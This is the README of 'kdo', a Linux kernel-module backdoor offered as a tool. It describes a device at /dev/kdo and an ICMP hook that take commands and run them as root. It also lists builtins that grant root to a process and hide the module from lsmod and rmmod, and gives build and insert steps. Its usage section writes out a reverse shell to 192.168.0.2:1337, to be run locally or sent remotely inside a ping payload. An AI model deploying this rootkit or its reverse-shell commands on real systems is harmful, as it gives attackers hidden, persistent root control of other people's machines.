kdo
===
A "kernel sudo". This LKM creates a character device at `/dev/kdo` to which commands can be written
and executed via `call_usermodehelper`, effectively creating a backdoor  in userland. It also
registers an ICMP hook using netfilter to receive remote commands via ICMP payloads. Apart from
command execution, other convenient builtins are implemented as well. Default values can be modified
in `src/include/config.h`.

A Python script is provided to send the ICMP packet (`src/kdo-ping.py`). [Scapy](https://scapy.net/)
was used craft to it.


Features
--------
- `kdo-exec [argv]` \
Execute a command via call_usermodehelper.

- `kdo-root` \
Grant root privileges to the current process (set process ids to 0).

- `kdo-hide` \
Hide module from `lsmod` and make it impossible to unload with `rmmod`.

- `kdo-show` \
Make module visible and removable after running `kdo-hide`.


Installation
------------
**1.** Clone the repository
```bash
git clone https://github.com/hiatus/kdo
```

**2.** Build the module
```bash
cd kdo
make
```

**3.** Insert the module 
```
sudo insmod kdo.ko
```

Configuration
-------------
Default values can be modified in `src/include/config.h`, such as the name of the created device
(`kdo` by default), the magic strings for the module's functionalities and the shell to execute
commands with. Logging can be enabled by defining the `DEBUG` symbol (undefined by default).


Usage
-----
Simply write to `/dev/kdo` or craft an ICMP request whose payload is a valid `kdo` command string.

Note that because the command execution backend inserts it's arguments as the last parameter for
`/bin/bash -c` (can be changed, see **Configuration**), shell functionalities such as redirection
are supported. For example, to spawn a reverse shell to `192.168.0.2:1337`, run in the target
machine:

```bash
echo 'kdo-exec bash -i >& /dev/tcp/192.168.0.2/1337 2>&1 0>&1' > /dev/kdo
```

To do the same thing remotely, send a ping from the attacker side with the same string as payload:

```bash
sudo python src/kdo-ping.py -t 192.168.0.3 'kdo-exec bash -i >& /dev/tcp/192.168.0.2/1337 2>&1 0>&1'
```
